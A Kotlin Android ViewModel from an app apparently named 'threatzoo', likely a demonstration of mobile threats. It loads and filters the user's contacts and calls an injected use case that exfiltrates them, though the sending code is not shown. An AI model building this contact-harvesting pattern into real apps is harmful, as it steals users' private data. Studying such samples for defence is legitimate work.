package com.valentimsts.threatzoo.presentation.contacts

import androidx.compose.runtime.mutableStateOf
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import javax.inject.Inject

import com.valentimsts.threatzoo.domain.repository.ContactRepository
import com.valentimsts.threatzoo.domain.usecase.ExfiltrateContactsUseCase
import com.valentimsts.threatzoo.presentation.contacts.utils.ContactsFilterState
import com.valentimsts.threatzoo.presentation.core.utils.TimestampOrder
import kotlinx.coroutines.launch

@HiltViewModel
class ContactsViewModel @Inject constructor(
    private val repository: ContactRepository,
    private val exfiltrateContactsUseCase: ExfiltrateContactsUseCase
) : ViewModel() {
    var viewState = mutableStateOf(ContactsViewState())

    fun fetchContacts() {
        viewState.value = viewState.value.copy(isLoading = true)

        viewModelScope.launch {
            val contacts = repository.fetchAllContacts()
            viewState.value = viewState.value.copy(
                isLoading = false,
                allContacts = contacts
            )
            applyFilters()
        }
    }

    fun updateSearchQuery(query: String) {
        viewState.value = viewState.value.copy(searchQuery = query)
        applyFilters()
    }

    fun updateFilter(filterState: ContactsFilterState) {
        viewState.value = viewState.value.copy(filterState = filterState)
        applyFilters()
    }

    private fun applyFilters() {
        val state = viewState.value
        val query = state.searchQuery.lowercase()

        val filtered = state.allContacts
        /**
            .filter { ctc ->
                (query.isEmpty()
                        || msg.fromAddress.lowercase().contains(query)
                        || msg.toAddress.lowercase().contains(query)
                        || msg.timestamp.toString().contains(query)
                        )
            }.sortedBy {
                if (state.filterState.timestampOrder == TimestampOrder.ASCENDING) it.timestamp
                else -it.timestamp
            }
        **/

        viewState.value = state.copy(visibleContacts = filtered)
    }

    fun exfiltrateContacts() {
        viewModelScope.launch {
            exfiltrateContactsUseCase()
        }
    }
}